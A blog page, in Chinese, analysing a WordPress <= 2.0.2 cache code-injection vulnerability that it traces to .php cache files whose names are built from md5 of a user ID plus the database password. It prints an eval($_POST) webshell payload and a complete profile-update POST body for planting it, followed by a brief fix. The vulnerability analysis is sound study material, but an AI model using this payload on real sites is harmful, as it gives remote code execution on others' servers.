@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>WordPress &lt;= 2.0.2 - (cache) 代码注入分析 | \\Johnis.online\BLOG</title>
+  <meta name="author" content="LonelyRain">
+  
+  <meta name="description" content="WordPress &amp;lt;= 2.0.2 - (cache) Remote Shell Injection Exploit
+影响条件:
+程序:WordPress
+版本:&amp;lt;= 2.0.2
+严重程度:高危
+
+简要这个漏洞问题出在WordPress生成的序列化后的缓存文件中.因为缓存文件的后缀为php,文件的内容可控,并且文件名在一定条件下可预见,所以在一定条件下可以getshell
+正文首先下断点在生成问题文件的地方
+程序流程图
+
+出问题的是wp-includes/cache.php文件中的save()函数
+save()函数序列化了用户的资料之后再保存到">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="WordPress &lt;= 2.0.2 - (cache) 代码注入分析"/>
+  <meta property="og:site_name" content="\\Johnis.online\BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/old/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/old/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="/old//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/old/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/old/">\\Johnis.online\BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/old/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> WordPress &lt;= 2.0.2 - (cache) 代码注入分析</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit"><a href="#WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit" class="headerlink" title="WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit"></a>WordPress &lt;= 2.0.2 - (cache) Remote Shell Injection Exploit</h1><ul>
+<li>影响条件:</li>
+<li>程序:WordPress</li>
+<li>版本:&lt;= 2.0.2</li>
+<li>严重程度:高危</li>
+</ul>
+<h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>这个漏洞问题出在WordPress生成的序列化后的缓存文件中.因为缓存文件的后缀为<code>php</code>,文件的内容可控,并且文件名在一定条件下可预见,所以在一定条件下可以getshell</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下断点在生成问题文件的地方</p>
+<p><strong>程序流程图</strong></p>
+<p><img src="/old/2017/10/10/WordPress-Vul-1/383653936.png" alt="1.png"></p>
+<p>出问题的是<br>wp-includes/cache.php<br>文件中的save()函数</p>
+<p>save()函数序列化了用户的资料之后再保存到</p>
+<a id="more"></a>
+<p><code>wp-content/cache/userlogins</code>,<code>wp-content/cache/users</code>这两个目录底下,因为序列化后的文件的后缀是<code>.php</code>所以只要想办法插入我们的恶意代码并且让PHP-cgi执行就好了.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$cache_file = $group_dir . md5($id . DB_PASSWORD) . <span class="string">'.php'</span>;</div><div class="line"><span class="comment">// Remove the cache file if the key is not set.</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;cache[$group][$id])) &#123;</div><div class="line"><span class="keyword">if</span> (file_exists($cache_file))</div><div class="line">@ unlink($cache_file);</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>save()函数中生成的缓存文件名方法是<code>md5($id . DB_PASSWORD)</code>.所以我们需要知道$id与DB_PASSWORD.</p>
+<p>$id的其中一个值就是管理员的帐号,一般都有一个帐号叫做<code>admin</code>.所以md5(‘admin’.’数据库密码’)就是包涵恶意代码的文件名.</p>
+<p>因为写入的文件内容由<code>//</code>开头</p>
+<p><img src="/old/2017/10/10/WordPress-Vul-1/1658973869.png" alt="2.png"></p>
+<p>如果不输入一个换行符的话,会被始终认为其后的内容是注释,所以需要加入回车符号,经过url编码后的回车符号是<code>%0D</code>并且需要在后面再加上<code>//</code>防止后面序列化的字符被程序认为是我们想要执行的代码,所以最终的payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//%0D@eval($_POST[&apos;c&apos;]);%0D//</div></pre></td></tr></table></figure>
+<p>这个漏洞的利用条件是:</p>
+<ol>
+<li>文件夹有写入权限</li>
+<li>cache功能打开</li>
+<li>知道用户的ID与数据库密码(可能为空)</li>
+</ol>
+<p>发送以下完整payload,就可以在<code>wp-content/cache/userlogins</code>或者<code>wp-content/cache/users/</code>中getshell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from=profile&amp;checkuser_id=1&amp;user_login=admin&amp;first_name=123&amp;last_name=&amp;nickname=test&amp;display_name=//%0D @eval($_POST[&apos;c&apos;]);%0D//&amp;email=admin@example.com&amp;url=http%3A%2F%2F&amp;aim=&amp;yim=&amp;jabber=&amp;description=&amp;pass1=&amp;pass2=&amp;rich_editing=true&amp;submit=Update+Profile+%C2%BB</div></pre></td></tr></table></figure>
+<p>修复方案:<br>1.将生成的文件命名为不可执行后缀例如<code>.txt</code></p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/old/2017/10/10/WordPress-2/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/old/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/old/2017/10/10/PHP-Type/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = '//lonelyrain-1.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="/old//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-10-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/old/categories/漏洞分析/">漏洞分析<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/old/tags/PHP/">PHP<span>11</span></a></li> <li><a href="/old/tags/漏洞分析/">漏洞分析<span>12</span></a></li> <li><a href="/old/tags/WordPress/">WordPress<span>4</span></a></li> <li><a href="/old/tags/代码注入/">代码注入<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#WordPress-lt-2-0-2-cache-Remote-Shell-Injection-Exploit"><span class="toc-article-text">WordPress <= 2.0.2 - (cache) Remote Shell Injection Exploit</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#简要"><span class="toc-article-text">简要</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#正文"><span class="toc-article-text">正文</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+var disqus_shortname = 'lonelyrain-1';
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2019 LonelyRain
+  
+</p>
+
+<script>
+  var disqus_shortname = 'lonelyrain-1';
+  
+  var disqus_url = 'http://cnlonelyrain.github.io/2017/10/10/WordPress-Vul-1/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/old/js/jquery.imagesloaded.min.js"></script>
+<script src="/old/js/gallery.js"></script>
+<script src="/old/js/bootstrap.min.js"></script>
+<script src="/old/js/main.js"></script>
+<script src="/old/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/old/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/old/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "old/search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "old/search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
